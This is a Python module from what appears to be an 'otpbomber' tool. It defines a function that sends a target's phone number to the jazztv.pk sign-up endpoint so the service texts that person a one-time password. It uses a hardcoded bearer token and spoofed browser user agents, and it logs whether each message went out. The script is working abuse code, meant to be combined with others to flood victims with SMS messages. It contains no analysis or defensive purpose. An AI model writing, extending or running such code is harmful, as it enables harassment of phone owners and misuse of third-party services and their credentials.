from otpbomber.core import *
from otpbomber.localuseragent import *

async def tamasha(phone, client, out):
    name = "tamasha"
    domain = "tamasha"
    frequent_rate_limit=False

    headers = {
        'User-Agent': random.choice(ua["browsers"]["chrome"]),
        'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9qYXp6dHYucGtcL2FscGhhXC9hcGlfZ2F0ZXdheVwvaW5kZXgucGhwXC9hdXRoXC9sb2dpbiIsImlhdCI6MTcyNzk0NjI5MCwiZXhwIjoxNzI4NTQ2MjkwLCJuYmYiOjE3Mjc5NDYyOTAsImp0aSI6Ilpyd0R4d2RINU9QRmp6dm0iLCJzdWIiOjYsInBydiI6Ijg3ZTBhZjFlZjlmZDE1ODEyZmRlYzk3MTUzYTE0ZTBiMDQ3NTQ2YWEifQ.6ykW4-M1Vuhco8ngLljlRh7sFaZBh-jsidhDvbIlFYg',
    }

    json_data = {
        'from_screen': 'signUp',
        'device': 'Google Chrome',
        'telco': 'jazz',
        'device_id': 'web',
        'is_header_enrichment': 'no',
        'other_telco': 'jazz',
        'mobile': f"92{phone[-10:]}",
        'phone_details': 'web',
    }

    response = await client.post(
        'https://jazztv.pk/alpha/api_gateway/index.php/v3/users-dbss/sign-up-wc',
        headers=headers,
        json=json_data,
    )
    if response.status_code == 200:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
        return None
    else:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None